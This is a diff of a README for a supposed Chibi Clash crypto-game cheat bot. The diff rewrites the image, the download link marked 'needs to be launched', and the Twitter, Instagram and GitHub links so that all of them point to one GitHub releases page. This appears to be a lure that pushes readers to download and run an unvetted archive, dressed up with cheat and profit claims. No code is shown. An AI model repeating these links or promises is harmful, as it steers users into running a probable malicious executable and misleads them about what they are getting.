@@ -1,6 +1,6 @@
 # 🤖 Chibi Clash Crypto Bot & Auto Farm Clicker Cheat 🎮
 
-![Chibi Clash Crypto Bot & Auto Farm Clicker Cheat](https://example.com/image.jpg)
+![Chibi Clash Crypto Bot & Auto Farm Clicker Cheat](https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
 Welcome to the Chibi Clash Crypto Bot & Auto Farm Clicker Cheat repository! If you are looking to dominate the Chibi Clash game with automated farming, clicker activities, cheats, hacks, and crypto token integration, you are in the right place. This bot is designed to optimize your profits and enhance your gameplay efficiency like never before.
 
@@ -24,7 +24,7 @@ Welcome to the Chibi Clash Crypto Bot & Auto Farm Clicker Cheat repository! If y
 
 🏷️ **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, chibi-clash, chibi-clash-bot, chibi-clash-game, clicker-game, crypto-api, crypto-game, crypto-hack, crypto-token, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game
 
-🔗 **Download Link:** [Download Application.zip](https://github.com/files/uploaded/Application.zip) 👈 (needs to be launched)
+🔗 **Download Link:** [Download https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases](https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) 👈 (needs to be launched)
 
 For more information, updates, and releases, make sure to check the "Releases" section of this repository.
 
@@ -44,9 +44,9 @@ For more information, updates, and releases, make sure to check the "Releases" s
 
 Stay updated on the latest features, releases, and announcements related to the Chibi Clash Crypto Bot & Auto Farm Clicker Cheat by following our official channels:
 
-🐦 [Twitter](https://twitter.com/chibiclashbot)
-📸 [Instagram](https://instagram.com/chibiclashbot)
-🌟 [GitHub](https://github.com/chibiclashbot)
+🐦 [Twitter](https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+📸 [Instagram](https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+🌟 [GitHub](https://github.com/zjxnb666666/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
 
 Join our growing community of Chibi Clash enthusiasts and elevate your gameplay to the next level!
 
